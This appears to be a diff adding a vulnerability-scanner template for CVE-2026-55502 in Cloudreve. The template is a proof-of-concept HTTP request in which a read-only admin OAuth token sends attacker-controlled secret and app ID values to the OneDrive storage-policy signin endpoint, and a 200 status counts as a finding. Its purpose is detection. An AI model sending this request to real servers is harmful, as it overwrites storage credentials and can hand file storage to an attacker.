@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "检测Cloudreve OAuth授权作用域绕过漏洞，通过仅拥有Admin.Read只读权限的OAuth令牌调用POST /api/v4/admin/policy/oauth/signin接口修改OneDrive存储策略凭据"
+id = "POC-AVE-2026-0619"
+name = "CVE-2026-55502 PoC"
+severity = "high"
+tags = ["cve-2026-55502"]
+vuln_id = [
+    "CVE-2026-55502",
+    "GHSA-hq88-5x99-x3gf",
+    "AVE-2026-0619",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v4/admin/policy/oauth/signin"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"id":1,"secret":"attacker-controlled-secret","app_id":"attacker-controlled-app-id"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
